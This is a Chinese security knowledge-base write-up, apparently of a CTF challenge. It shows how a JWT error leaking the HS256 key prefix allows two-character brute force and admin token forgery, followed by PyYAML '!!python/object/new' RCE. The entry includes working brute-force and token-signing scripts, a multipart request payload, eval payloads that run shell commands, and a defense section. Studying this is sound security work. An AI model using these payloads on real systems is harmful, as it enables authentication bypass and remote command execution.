---
id: web-python-deserialization-jwt-key-hint-brute-pyyaml-sandbox-rce
title: JWT 错误回显泄露 HS256 密钥前缀与字符集，尾部两位爆破伪造 admin 后经 PyYAML object/new 执行命令
type: scenario
domain: web
path: web/python/deserialization
technique: jwt-key-hint-brute-pyyaml-unsafe-load-rce
tags:
- jwt
- hs256
- brute-force
- authentication-bypass
- pyyaml
- deserialization
- yaml
- rce
- sandbox
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V235
  verified_at: '2026-11-07T09:35:34+08:00'
  notes: 已对照原文与图04-08核对：错误提示泄露前缀与2位字母数字、92字符集8464种、密钥 @o70xO$0%#qR9#m0、伪造 admin、os.system sleep 5 延时、eval 回显 uid=0、cat /f* 均一致；修正卡片提示字符串多写的*与86×86笔误。未验证点：未复跑爆破与 PyYAML 载荷。frontmatter 无 sources/source_url。
url: /docs/web/python/deserialization/web-python-deserialization-jwt-key-hint-brute-pyyaml-sandbox-rce/
draft: false
kb_aliases:
- JWT 密钥前缀提示爆破
- 部分已知 HS256 密钥爆破
- ez_python JWT PyYAML 链
- PyYAML object/new os.system
- '!!python/object/new:eval'
---

## 一句话结论

目标校验失败时返回的 JSON 直接泄露了 HS256 密钥前缀并说明“缺失的 2 个字符是字母数字”，攻击者据此把密钥空间压到 62²（原文脚本用 92 字符集约 8464 种）离线爆破出完整密钥，重签 `username/role=admin` 的 JWT 进入后台；后台 `/sandbox` 接收 multipart 上传的 `codefile` 并以 `yaml.load` 解析，提交 `!!python/object/new:os.system ["sleep 5"]` 造成 5 秒延迟，换成 `!!python/object/new:eval` 加 `__import__('os').popen(...).read()` 即可回显 `uid=0(root)` 与 `/flag`。

## 原理

- **HS256 密钥可离线验证**：JWT 的签名是 `HMAC-SHA256(header.payload, secret)`；给定一个合法 token，候选密钥可以完全离线计算并比对，不需要向服务端发包。
- **错误信息泄露密钥空间**：服务端在 JWT 解析失败时返回 `Key starts with "@o70xO$0%#qR9#*"`（`*` 标记未知尾字符），并说明缺失的两位是字母数字；这使原本高熵的密钥退化为“已知前缀 + 最多 62² 种后缀”。原文脚本用 92 字符集（含符号）遍历两位，实际密钥为 `@o70xO$0%#qR9#m0`，在第 1157 次尝试命中（92×92=8464 的枚举空间内）。
- **伪造 admin**：拿到密钥后，用同样的 HS256 算法签发 payload `{"username":"admin","role":"admin"}` 的 token；服务端只验签并信任 claim，未回查数据库，因此获得管理员权限。
- **后台 YAML 解析**：`/sandbox` 是“执行文件需要 admin”的功能，接收 multipart `codefile` 与 `mode=yaml`，对上传内容调用 PyYAML 的不安全加载（`yaml.load` 默认/FullConstructor，或旧版 `Loader`）。
- **`!!python/object/new` 构造链**：PyYAML 会按 `!!python/object/new:<callable>` 导入模块函数并用给出的参数列表/序列创建对象，等价于直接调用该函数。`!!python/object/new:os.system ["sleep 5"]` 即执行 `os.system("sleep 5")`；返回码 0 会出现在响应 `result` 中，但 `os.system` 不回显命令 stdout，所以原文先用它做延时验证。
- **eval 回显**：`!!python/object/new:eval - "__import__('os').popen('id').read()"` 调用 `eval("__import__('os').popen('id').read()")`，把命令输出作为返回值，响应即可带回 `uid=0(root)`；同理 `cat /f*` 读出 flag。
- **为什么成立**：错误响应把密钥熵泄露给攻击者；服务端用弱密钥且仅信任 JWT claim；后台又对用户可控内容使用可构造任意对象的 YAML 解析器，三处缺陷串成完整 RCE。

## 触发条件

- 应用使用 HS256 JWT，且校验失败时返回的报错包含密钥前缀、长度、字符集等提示。
- 密钥本身熵不足（可枚举）或提示把搜索空间压到可爆破范围。
- 服务端信任 JWT 中的 `username`/`role`，未回查数据库或二次鉴权。
- 存在仅管理员可用的“代码执行/沙箱/配置解析”功能，接收上传文件并对内容调用 `yaml.load`（而非 `safe_load`），且未禁用 `!!python/*` 标签。
- 攻击者能提交 multipart 表单（`codefile` + `mode=yaml`）并携带伪造的 admin Bearer token。

## 利用步骤

1. 用任意伪造/过期 JWT 请求受保护接口，读取错误响应中的密钥提示（前缀、缺失字符数与字符集）。
2. 写脚本枚举缺失位，计算 `HMAC-SHA256(header.payload, prefix+suffix)` 与 token 签名比对，得到完整密钥。
3. 用该密钥重签 `{"username":"admin","role":"admin"}` 的 JWT。
4. 以 admin Bearer 向 `/sandbox` 发送 multipart：`codefile` 内容为 `!!python/object/new:os.system ["sleep 5"]`，`mode=yaml`；观察响应耗时约 5 秒、`result` 为 `"0"`，确认命令执行。
5. 替换为回显 payload：`!!python/object/new:eval - "__import__('os').popen('id').read()"`，确认 `uid=0(root)`。
6. 读取 flag：`!!python/object/new:eval - "__import__('os').popen('cat /f*').read()"`。

## PoC

```python
import base64, hmac, hashlib, itertools, json

token = "<合法或伪造的 JWT>"
prefix = "@o70xO$0%#qR9#"          # 来自错误提示
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
h, p, sig = token.split(".")
signed = f"{h}.{p}".encode()

def b64url(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")

for a, b in itertools.product(charset, repeat=2):
    secret = (prefix + a + b).encode()
    if b64url(hmac.new(secret, signed, hashlib.sha256).digest()) == sig:
        print("secret =", secret.decode())
        break
```

```python
# 用爆破出的密钥重签 admin
import base64, hmac, hashlib, json
secret = b"@o70xO$0%#qR9#m0"
def b64url(x): return base64.urlsafe_b64encode(json.dumps(x, separators=(",", ":")).encode()).rstrip(b"=")
msg = b".".join([b64url({"alg": "HS256", "typ": "JWT"}), b64url({"username": "admin", "role": "admin"})])
print((msg + b"." + base64.urlsafe_b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).rstrip(b"=")).decode())
```

```http
POST /sandbox HTTP/1.1
Authorization: Bearer <admin JWT>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="codefile"; filename="1.py"
Content-Type: text/x-python

!!python/object/new:os.system ["sleep 5"]
------x
Content-Disposition: form-data; name="mode"

yaml
------x--
```

```yaml
# 回显命令输出
!!python/object/new:eval
- "__import__('os').popen('cat /f*').read()"
```

## 变体与关联

- **密钥提示变体**：错误信息泄露前缀、长度、字符集、常见单词；只要能缩小搜索空间，就可离线爆破。若完全无提示，则退回字典/规则爆破。
- **claims 变体**：`role`、`is_admin`、`username`、`sub` 等 claim 被直接信任；也可配合 `alg=none`、RS256→HS256 混淆、`kid` 注入。
- **YAML 载荷变体**：`!!python/object/new:os.system`（盲执行，返回码）、`!!python/object/new:eval`（回显）、`!!python/object/new:subprocess.check_output`、`!!python/object/apply`（旧版/UnsafeLoader）。
- **关联**：[[web-generic-jwt-weak-hmac-key-bruteforce]]（HS256 字典爆破后签发任意 JWT）、[[web-python-deserialization-pyyaml-fullconstructor-bypass-object-new]]（FullLoader 下 object/new 的绕过构造链）、[[web-python-deserialization-feast-kubernetes-materializer-yaml-load-rce]]（yaml.load 解析可控配置导致 RCE）。

## 检测与防御

- **JWT**：密钥使用高熵随机值并定期轮换；错误响应只返回通用的“认证失败”，不泄露前缀、长度、字符集或算法细节；服务端从数据库回查用户与角色，不信任 token 内 claim；校验 `alg` 白名单、`exp`/`iat`/`aud`/`iss`。
- **YAML**：一律使用 `yaml.safe_load`；禁止 `!!python/*` 标签；确需复杂类型时用显式 schema/白名单。
- **沙箱**：不要对用户上传内容直接 `exec`/`eval`/`yaml.load`；沙箱应做进程级隔离、只读文件系统、网络隔离与最小权限。
- **检测**：监控 JWT 报错中泄露密钥信息的响应；监控短时间大量 JWT 校验失败与随后的 admin 访问；监控 YAML 中出现 `!!python/`、`object/new`、`object/apply`、`eval`、`os.system`。
